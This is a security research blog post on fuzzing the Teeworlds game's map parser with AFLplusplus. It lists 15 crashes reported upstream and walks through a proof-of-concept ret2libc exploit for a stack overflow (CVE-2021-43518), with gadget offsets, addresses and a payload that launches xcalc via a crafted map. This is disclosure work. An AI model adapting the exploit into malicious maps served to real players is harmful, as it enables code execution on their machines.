@@ -1,0 +1,334 @@
+# Fuzzing game map parsers, part 1 - Teeworlds
+
+2021-11-01
+
+**tl;dr**: Using AFLplusplus for fuzzing map parser in Teeworlds. Two different approaches (quick and thorough) result in 15 crashes in total (one exploitable).
+
+## Intro
+
+Games that support loading custom maps have to deal with parsing pretty complex files and complexity may lead to bugs. It may be especially important for online games, where players connecting to a server download and parse missing map files. If players can to set up their servers and offer custom maps then this process may be abused. A malicious server may cause unaware players to download a specially crafted map and cause unexpected behavior (desirable code execution). I decided to focus more on that topic and select an online game that can serve custom maps to players joining a game.
+
+As my first target, I chose Teeworlds, an online shooter that I had analyzed [before](https://logicaltrust.net/blog/2020/07/socketfuzzer.html) but from a different angle. The game has a map editor and players joining a game automatically download a missing map. This behavior makes this game a great candidate for research.
+
+## Preparation
+
+The game’s source code is available at [GitHub](https://github.com/teeworlds/teeworlds/) and documented instructions are enough to build the game on Ubuntu 20.04. However, before building the game with AFLplusplus I had to introduce some changes to the code to make fuzzing possible and efficient - more details in a moment.
+
+Besides the code changes, I also needed input files. I decided to take the smallest original map that is available in the game.
+
+``` plaintext
+$ ls -laS datasrc/maps/
+total 348
+[...]
+-rw-rw-r--  1 m m  5731 Oct 22 16:19 ctf1.map
+[...]
+```
+
+Its size was quite big but at least the map was valid and I was sure that it parses correctly.
+
+## Approach 1 - quick
+
+Running the game to parse a map has its drawbacks. When the game starts it loads a map from a file and then during the whole gameplay uses its data for rendering, calculations, and so on. I had to decide at which moment of execution I want to stop it. I was curious if bugs are more likely to happen in code that is responsible for reading a map from a file and preparing data structures or rather in later phases when this data is being used. There was nothing left to do but check both cases.
+
+So for the first case, I took stopping the game immediately after parsing a file. I found a suitable place in the code - after all necessary initialization - and invoked parsing a map. A filename passed to a method was hardcoded because in a normal situation a client receives a filename from a server.
+
+``` plaintext
+diff --git a/src/engine/client/client.cpp b/src/engine/client/client.cpp
+index b9a2e014..4b5a9e16 100644
+--- a/src/engine/client/client.cpp
++++ b/src/engine/client/client.cpp
+@@ -1842,6 +1842,10 @@ void CClient::InitInterfaces()
+        m_Blacklist.Init();
+        m_DemoRecorder.Init(Console(), m_pStorage);
+        m_DemoPlayer.Init(Console(), m_pStorage);
++
++       __AFL_INIT();
++       m_pMap->Load("maps/666.map");
++       exit(0);
+ }
+```
+
+At that point, I was ready to build and start fuzzing.
+
+## Approach 2 - thorough
+
+When the process of fuzzing the first case was ongoing, I looked into the source code again to cause the game to parse and really use map data but also to exit in a reasonable time. In this case, communication with a server was necessary to cause the gameplay to start.
+
+I ended up introducing the following changes:
+
+1.  Disable CRC and SHA256 checksum checking - these values are sent by a server just to be sure that both sides use the same file. For fuzzing, those checks could be ignored.
+2.  Exit the game after 150 frames. This value was chosen as the result of experimentation and was enough for the game to display a map on the screen.
+
+``` plaintext
+diff --git a/src/engine/client/client.cpp b/src/engine/client/client.cpp
+index b9a2e014..4b5a9e16 100644
+--- a/src/engine/client/client.cpp
++++ b/src/engine/client/client.cpp
+@@ -810,7 +810,7 @@ const char *CClient::LoadMap(const char *pName, const char *pFilename, const SHA
+                return aErrorMsg;
+        }
+ 
+-       if(pWantedSha256 && m_pMap->Sha256() != *pWantedSha256)
++       if(0 && pWantedSha256 && m_pMap->Sha256() != *pWantedSha256)
+        {
+                char aSha256[SHA256_MAXSTRSIZE];
+                char aWantedSha256[SHA256_MAXSTRSIZE];
+@@ -823,7 +823,7 @@ const char *CClient::LoadMap(const char *pName, const char *pFilename, const SHA
+        }
+ 
+        // get the crc of the map
+-       if(m_pMap->Crc() != WantedCrc)
++       if(0 && m_pMap->Crc() != WantedCrc)
+        {
+                str_format(aErrorMsg, sizeof(aErrorMsg), "map differs from the server. found = %08x wanted = %08x", m_pMap->Crc(), WantedCrc);
+                m_pConsole->Print(IConsole::OUTPUT_LEVEL_ADDINFO, "client", aErrorMsg);
+@@ -1999,7 +2003,7 @@ void CClient::Run()
+        char aBuf[256];
+        str_format(aBuf, sizeof(aBuf), "netversion %s", GameClient()->NetVersion());
+        m_pConsole->Print(IConsole::OUTPUT_LEVEL_STANDARD, "client", aBuf);
+-       if(str_comp(GameClient()->NetVersionHashUsed(), GameClient()->NetVersionHashReal()))
++       if(0 && str_comp(GameClient()->NetVersionHashUsed(), GameClient()->NetVersionHashReal()))
+        {
+                m_pConsole->Print(IConsole::OUTPUT_LEVEL_STANDARD, "client", "WARNING: netversion hash differs");
+        }
+@@ -2128,7 +2132,10 @@ void CClient::Run()
+                                // when we are stress testing only render every 10th frame
+                                if(!Config()->m_DbgStress || (m_RenderFrames%10) == 0 )
+                                {
++                                       static int fuzz_counter = 0;
++                                       fuzz_counter++;
+                                        Render();
++                                       if (fuzz_counter == 150) exit(0);
+                                        m_pGraphics->Swap();
+```
+
+To make the fuzzing work, I had to run the server and make the fuzzed client connect to it. Hopefully, all necessary options were already implemented as command line parameters.
+
+``` plaintext
+$ echo 'sv_map 666' > config.cfg
+$ ./teeworlds_srv -f config.cfg
+```
+
+``` plaintext
+$ ./afl-fuzz -f /home/mmm/teeworlds/build/data/maps/666.map -i - -o /home/mmm/output -t 5000 -- ./teeworlds "connect 127.0.0.1" "gfx_fullscreen 0" "gfx_screen_height 240" "gfx_screen_width 360"
+```
+
+The `-f` parameter points to a file where AFLplusplus was saving its mutated input. Even though the client was connecting to the server, it was noticing that already had a map with the desired name so it was loading it from the disk instead of downloading from the server.
+
+An additional profit of this approach was the possibility to observe what the fuzzer was changing in the map file. It didn’t have any value for the fuzzing but at least was fun to watch.
+
+![](https://mmmds.pl/images/teeworlds.gif)
+
+## Coverage
+
+After approximately 24 hours I decided to check the results. To my surprise, both approaches turned out to be successful. The first approach was much faster but covered less code than the painfully slow second approach.
+
+I used [afl-cov](https://github.com/vanhauser-thc/afl-cov) to generate code coverage reports for the initial test case as well as for all entries generated by AFL during the fuzzing. In that way, it’s visible how much code the fuzzing actually covered.
+
+- First approach
+  - initial test case - lines: **5.2%**, functions: **7.9%**
+  - whole fuzzing - lines: **5.3**, functions: **8.1%**
+- Second approach
+  - initial test case - lines: **26.7%**, functions: **35.4%**
+  - whole fuzzing - lines: **29.2%**, functions: **37%**
+
+Commands used for generating a report for:
+
+- the initial test case
+
+  ``` plaintext
+  afl-cov -d /home/mmm/teeworlds/output/ --coverage-cmd "./teeworlds 'connect 127.0.0.1' 'gfx_fullscreen 0' 'gfx_screen_height 240' 'gfx_screen_width 360'" --code-dir /home/mmm/teeworlds-afl-cov/  --afl-file /home/mmm/teeworlds-afl-cov/build/data/maps/666.map --afl-queue-id-limit 1
+  ```
+
+- all entries
+
+  ``` plaintext
+  afl-cov -d /home/mmm/teeworlds/output/ --coverage-cmd "./teeworlds 'connect 127.0.0.1' 'gfx_fullscreen 0' 'gfx_screen_height 240' 'gfx_screen_width 360'" --code-dir /home/mmm/teeworlds-afl-cov/  --afl-file /home/mmm/teeworlds-afl-cov/build/data/maps/666.map
+  ```
+
+The `--afl-file` parameter may look unfamiliar because I implemented it for this specific case. At the moment of writing, afl-cov does not support passing an input file in a way that AFL’s `-f` parameter does. The change is currently available [here](https://github.com/vanhauser-thc/afl-cov/pull/5/files).
+
+## Results
+
+The first approach resulted in **4** unique crashes. The second approach was responsible for **11** more unique crashes.
+
+I reported all crashes on GitHub:
+
+- Null pointer dereference (read)
+  - <https://github.com/teeworlds/teeworlds/issues/2968>
+  - <https://github.com/teeworlds/teeworlds/issues/2973>
+  - <https://github.com/teeworlds/teeworlds/issues/2980>
+- Heap buffer overflow (read)
+  - <https://github.com/teeworlds/teeworlds/issues/2969>
+  - <https://github.com/teeworlds/teeworlds/issues/2971>
+  - <https://github.com/teeworlds/teeworlds/issues/2972>
+  - <https://github.com/teeworlds/teeworlds/issues/2974>
+  - <https://github.com/teeworlds/teeworlds/issues/2975>
+  - <https://github.com/teeworlds/teeworlds/issues/2976>
+  - <https://github.com/teeworlds/teeworlds/issues/2977>
+  - <https://github.com/teeworlds/teeworlds/issues/2978>
+  - <https://github.com/teeworlds/teeworlds/issues/2979>
+  - <https://github.com/teeworlds/teeworlds/issues/2982>
+- Stack buffer overflow (write)
+  - <https://github.com/teeworlds/teeworlds/issues/2981> ([CVE-2021-43518](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43518))
+- Use after free (read)
+  - <https://github.com/teeworlds/teeworlds/issues/2970>
+
+### Crash analysis
+
+From those crashes, the one related to writing on the stack seemed to be most interesting.
+
+``` plaintext
+==33805==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffffffd8f78 at pc 0x5555556fae80 bp 0x7ffffffd8e10 sp 0x7ffffffd8e00
+WRITE of size 4 at 0x7ffffffd8f78 thread T0
+    #0 0x5555556fae7f in CMapLayers::LoadEnvPoints(CLayers const*, array<CEnvPoint, allocator_default<CEnvPoint> >&) /home/osboxes/teeworlds/teeworlds-asan/src/game/client/components/maplayers.cpp:184
+    #1 0x5555556fcf3b in CMapLayers::OnMapLoad() /home/osboxes/teeworlds/teeworlds-asan/src/game/client/components/maplayers.cpp:117
+    #2 0x555555839981 in CGameClient::OnConnected() /home/osboxes/teeworlds/teeworlds-asan/src/game/client/gameclient.cpp:459
+    #3 0x5555555f6755 in CClient::ProcessServerPacket(CNetChunk*) /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:1283
+    #4 0x5555555f91ce in CClient::PumpNetwork() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:1596
+    #5 0x5555555f9596 in CClient::Update() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:1766
+    #6 0x5555555fc1f0 in CClient::Run() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:2108
+    #7 0x5555555d24e5 in main /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:2704
+    #8 0x7ffff68e10b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)
+    #9 0x5555555dc48d in _start (/home/osboxes/teeworlds/teeworlds-asan/build/teeworlds+0x8848d)
+```
+
+``` plaintext
+[...]
+169:  for(int i = 0; i < pItem->m_NumPoints; i++)
+170:  {
+171:          // convert CEnvPoint_v1 -> CEnvPoint
+172:          CEnvPoint_v1 *pEnvPoint_v1 = &((CEnvPoint_v1 *)pPoints)[i + pItem->m_StartPoint];
+173:          CEnvPoint p;
+174:  
+175:          p.m_Time = pEnvPoint_v1->m_Time;
+176:          p.m_Curvetype = pEnvPoint_v1->m_Curvetype;
+177:  
+178:          for(int c = 0; c < pItem->m_Channels; c++)
+179:          {
+180:                  p.m_aValues[c] = pEnvPoint_v1->m_aValues[c];
+181:                  p.m_aInTangentdx[c] = 0;
+182:                  p.m_aInTangentdy[c] = 0;
+183:                  p.m_aOutTangentdx[c] = 0;
+184:                  p.m_aOutTangentdy[c] = 0;
+185:          }
+[...]
+```
+
+`pItem->m_Channels` and `pEnvPoint_v1->m_aValues` are values coming from the map file. The nested loop lacks additional condition and allows writing outside the `p.m_aValues` 4-element array.
+
+``` plaintext
+struct CEnvPoint : public CEnvPoint_v1
+{
+        // bezier curve only
+        // dx in ms and dy as 22.10 fxp
+        int m_aInTangentdx[4];
+        int m_aInTangentdy[4];
+        int m_aOutTangentdx[4];
+        int m_aOutTangentdy[4];
+
+        bool operator<(const CEnvPoint& other) const { return m_Time < other.m_Time; }
+};
+```
+
+~~It looked promising, however, I didn’t find a working way to exploit it, and as it wasn’t the main area of my effort I postponed it for another time.~~
+
+Update: As a friend pointed out and put me in the right direction, I did a mistake analyzing an optimized code (~~which was weird for a project compiled with the `-O0` flag~~ which was caused by using a release target in cmake that enables optimization). However, the [official build](https://www.teeworlds.com/?page=downloads) does not have an optimized code that broke exploitation attempts. Additionally, the binary even has the stack protection disabled what makes it even easier.
+
+``` plaintext
+$ checksec --file=teeworlds 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   4168) Symbols     No    0               12              teeworlds
+```
+
+With a little modification made to the map, I overwrote the instruction pointer.
+
+``` plaintext
+$ gdb --args ./teeworlds 'connect 127.0.0.1' 
+[...]
+Thread 1 "teeworlds" received signal SIGSEGV, Segmentation fault.
+0x000000aabbccddee in ?? ()
+```
+
+### Exploit
+
+I decided to exploit it just for fun. Unfortunately, there were no other bugs that could be chained to bypass ASLR. For the purpose of the exercise, I continued with ASLR disabled and use ret2libc technique to pop a calc executing `system("/usr/bin/xcalc")`.
+
+To succeed with ret2libc exploit, I required the following things:
+
+1.  Gadget with `ret` and `pop rdi; ret` instructions to align the stack, load the parameter for the `system` function and jump to it
+
+    ``` plaintext
+    $ ROPgadget --binary teeworlds | grep 'pop rdi ; ret'
+    [...]
+    0x0000000000011339 : pop rdi ; ret
+    [...]
+    ```
+
+    - The `pop rdi; ret` instructions were at offset `0x011339` and the sole `ret` at `0x011339`
+
+    - To make use of those instructions it was also necessary to calculate their absolute addresses by adding their offsets to the address at which the binary was loaded.
+
+      ``` plaintext
+      (gdb) info proc mappings
+      process 13108
+      Mapped address spaces:
+
+         Start Addr           End Addr       Size     Offset objfile
+         0x555555554000     0x555555695000   0x141000        0x0 /home/osboxes/Downloads/teeworlds-0.7.5-linux_x86_64/teeworlds
+      ```
+
+      - `0x555555554000 + 0x01133A = 0x55555556533A`
+      - `0x555555554000 + 0x011339 = 0x555555565339`
+
+2.  Address of the `system` function
+
+    ``` plaintext
+    (gdb) p system
+    $3 = {int (const char *)} 0x7ffff76c9410 <__libc_system>
+    ```
+
+3.  Address of the `/usr/bin/xcalc` string
+    - I put the string in that part of the map that was written to the stack. The exact address I found by examining available strings on the stack under gdb.
+
+      ``` plaintext
+      0x7ffffffddc20: "/usr/bin/xcalc"
+      ```
+
+Having all the prerequisites, I combined them into a final exploit: `3A535655555500 39535655555500 20DCFDFFFF7F00 10946CF7FF7F00` and I put it in the place of the value that was messing with the instruction pointer. So that time when the map was loaded, the stack was overwritten with valid addresses that redirected execution into the `system` function with the desired parameter.
+
+![](https://mmmds.pl/images/teeexploit.gif)
+
+### Additional bug
+
+When running with ASAN, the game was crashing immediately and reporting use after free error. To avoid this problem during the fuzzing I disabled ASAN for the faulty method.
+
+``` plaintext
+diff --git a/src/game/client/components/menus_browser.cpp b/src/game/client/components/menus_browser.cpp
+index 85f1bde1..d0cb938d 100644
+--- a/src/game/client/components/menus_browser.cpp
++++ b/src/game/client/components/menus_browser.cpp
+@@ -1,3 +1,8 @@
++#if defined(__clang__) || defined (__GNUC__)
++# define ATTRIBUTE_NO_SANITIZE_ADDRESS __attribute__((no_sanitize_address))
++#else
++# define ATTRIBUTE_NO_SANITIZE_ADDRESS
++#endif
+ /* (c) Magnus Auvinen. See licence.txt in the root of the distribution for more information. */
+ /* If you are missing that file, acquire a complete release at teeworlds.com.                */
+ #include <algorithm> // sort  TODO: remove this
+@@ -75,6 +80,7 @@ void CMenus::CBrowserFilter::Reset()
+        }
+ }
+ 
++ATTRIBUTE_NO_SANITIZE_ADDRESS
+ void CMenus::CBrowserFilter::Switch()
+ {
+        m_Extended ^= 1;
+```
+
+This small teebug was also reported: <https://github.com/teeworlds/teeworlds/issues/2967>
+
+## Summary
+
+Two approaches to fuzzing a map parser detected **15** crashes in total. All of those findings could be used to set up a malicious server and mess up clients’ memory and crash them. One of them turned out to be serious enough to allow code execution. As the results appeared satisfying I will look into other online games as well.
